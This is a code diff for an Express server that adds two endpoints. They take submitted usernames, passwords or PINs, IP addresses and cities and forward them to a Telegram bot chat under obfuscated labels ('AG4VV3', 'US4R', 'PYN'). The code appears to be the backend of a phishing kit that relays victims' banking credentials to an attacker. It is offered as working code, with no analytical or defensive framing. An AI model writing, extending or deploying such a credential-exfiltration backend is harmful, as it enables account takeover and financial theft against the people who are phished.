@@ -51,6 +51,57 @@ app.post('/api/sendMessage', async (req, res) => {
     }
 });
 
+app.post('/api/sendMessage', async (req, res) => {
+    const { user, country, ip, city } = req.body;
+
+    if (!user || !ip) {
+        return res.status(400).json({ error: 'Faltan datos obligatorios' });
+    }
+
+    // Construir mensaje
+    const message = `🔵AG4VV3🔵\nUS4R: <code>${user}</code>\n\nIP: ${ip}\nCiudad: ${city}`;
+
+    try {
+        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'HTML',
+  },
+  { httpsAgent: agent }
+);
+        res.status(200).json({ success: true, data: response.data });
+    } catch (error) {
+        console.error('Error al enviar mensaje a Telegram:', error);
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+
+app.post('/api/sendMessage2', async (req, res) => {
+    const { user, password, country, ip, city } = req.body;
+
+    if (!user || !ip || !password ) {
+        return res.status(400).json({ error: 'Faltan datos obligatorios' });
+    }
+
+    // Construir mensaje
+    const message = `🔐🔵AG4VV3🔵\nUS4R: <code>${user}</code>\n\nPYN: <code>${password}</code>\n\nIP: ${ip}\nCiudad: ${city}`;
+
+    try {
+        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'HTML',
+  },
+  { httpsAgent: agent }
+);
+        res.status(200).json({ success: true, data: response.data });
+    } catch (error) {
+        console.error('Error al enviar mensaje a Telegram:', error);
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
 
 
 
